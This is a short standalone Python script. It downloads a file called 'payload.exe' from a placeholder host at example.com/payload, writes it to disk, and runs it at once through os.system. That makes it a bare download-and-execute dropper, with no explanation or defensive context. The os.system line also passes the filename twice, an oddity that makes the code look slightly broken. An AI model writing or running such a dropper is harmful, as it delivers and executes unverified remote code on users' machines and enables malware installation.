import os
import requests

url = 'http://example.com/payload'
filename = 'payload.exe'

response = requests.get(url, stream=True)

if response.status_code == 200:
    with open(filename, 'wb') as f:
        for chunk in response.iter_content(1024):
            if chunk:  # filter out keep-alive chunks
                f.write(chunk)

    os.system('{0} {1}'.format(filename, filename))
else:
    print('Error downloading file')